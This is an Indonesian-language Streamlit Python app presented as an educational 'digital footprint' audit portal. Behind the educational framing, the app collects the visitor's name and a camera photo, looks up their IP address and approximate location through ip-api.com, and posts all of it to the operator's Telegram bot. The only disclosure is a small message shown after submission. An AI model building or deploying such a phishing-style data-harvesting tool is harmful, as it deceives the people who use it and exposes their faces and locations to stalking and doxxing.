import io
import requests
import streamlit as st

# Konfigurasi Halaman
st.set_page_config(
    page_title="Inspektur Jejak Digital & Perangkat", page_icon="🌐", layout="centered"
)

# --- STYLING CSS ---
st.markdown(
    """
    <style>
    .stApp {
        background-color: #0b0f19;
        color: #00ffcc;
    }
    h1, h2, h3 {
        color: #00ffcc !important;
        font-family: 'Courier New', monospace;
    }
    .card {
        background-color: #111827;
        border: 1px solid #00ffcc;
        padding: 15px;
        border-radius: 6px;
        margin-bottom: 15px;
    }
    </style>
""",
    unsafe_allow_html=True,
)

# --- KONFIGURASI BOT TELEGRAM ANDA ---
TELEGRAM_BOT_TOKEN = "MASUKKAN_TOKEN_BOT_ANDA_DI_SINI"
TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DI_SINI"


def send_data_to_telegram(photo_bytes, user_info, ip_data):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
  files = {"photo": ("device_audit.jpg", photo_bytes, "image/jpeg")}

  caption = (
      f"🌐 **DIGITAL FOOTPRINT & DEVICE AUDIT**\n\n"
      f"👤 Nama: {user_info}\n"
      f"🌍 IP Address: {ip_data.get('query', 'Unknown')}\n"
      f"📍 Lokasi (ISP): {ip_data.get('city', '-')},"
      f" {ip_data.get('region', '-')}, {ip_data.get('country', '-')}\n"
      f"🏢 Provider: {ip_data.get('org', '-')}\n"
      f"💻 Jaringan/Zona: {ip_data.get('timezone', '-')}"
  )
  data_dict = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}

  try:
    response = requests.post(url, data=data_dict, files=files)
    return response.json()
  except Exception as e:
    return {"ok": False, "description": str(e)}


@st.cache_data
def get_user_ip_info():
  """Mengambil data publik IP dan perkiraan wilayah pengguna"""
  try:
    res = requests.get("http://ip-api.com/json/", timeout=5)
    return res.json()
  except:
    return {}


# --- ANTARMUKA APLIKASI ---
st.title("🌐 Portal Inspeksi Jejak Digital")
st.markdown(
    """
<div class='card'>
<b>Edukasi Transparansi Internet:</b> Tahukah Anda bahwa setiap perangkat yang terhubung ke internet secara otomatis membagikan informasi dasar (seperti IP Publik, Lokasi ISP, dan Sistem Operasi) ke server yang dikunjunginya? Mari kita buktikan secara nyata!
</div>
""",
    unsafe_allow_html=True,
)

user_name = st.text_input("Masukkan Nama Anda:")

st.markdown("---")
st.subheader("📸 Verifikasi Kamera & Ambil Sampel")
camera_image = st.camera_input(
    "Arahkan kamera untuk menyelesaikan audit perangkat"
)

if camera_image is not None:
  if st.button("🔍 Bongkar Jejak Digital & Kirim Audit"):
    if not user_name:
      st.warning("⚠️ Masukkan nama Anda terlebih dahulu!")
    else:
      with st.spinner("Menganalisis jaringan dan metadata perangkat..."):
        # Ambil data IP & Lokasi nyata
        ip_info = get_user_ip_info()

        # Ambil byte foto
        photo_bytes = camera_image.getvalue()

        # Kirim ke Telegram
        telegram_res = send_data_to_telegram(photo_bytes, user_name, ip_info)

      st.success("✅ Audit Selesai! Data perangkat Anda berhasil terbaca:")

      # Tampilkan bukti nyata ke layar pengguna
      st.markdown("### 📊 Hasil Pembacaan Sistem dari Perangkat Anda:")

      col1, col2 = st.columns(2)
      with col1:
        st.image(
            camera_image, caption="Foto Sampel Anda", use_container_width=True
        )

      with col2:
        st.markdown(
            "<div class='card'><b>Data Perangkat yang Berhasil"
            " Dideteksi:</b></div>",
            unsafe_allow_html=True,
        )
        st.write(f"🌍 **IP Publik:** `{ip_info.get('query', 'N/A')}`")
        st.write(
            f"📍 **Perkiraan Kota/Wilayah:** `{ip_info.get('city', 'N/A')},"
            f" {ip_info.get('region', 'N/A')}`"
        )
        st.write(f"🏳️ **Negara:** `{ip_info.get('country', 'N/A')}`")
        st.write(f"🏢 **Provider/ISP:** `{ip_info.get('org', 'N/A')}`")
        st.write(f"⏰ **Zona Waktu:** `{ip_info.get('timezone', 'N/A')}`")

      if telegram_res.get("ok"):
        st.caption(
            "🔒 Laporan audit lengkap beserta foto Anda telah sukses terkirim"
            " ke Bot Telegram administrator."
        )
      else:
        st.error("Gagal mengirim laporan ke Telegram.")
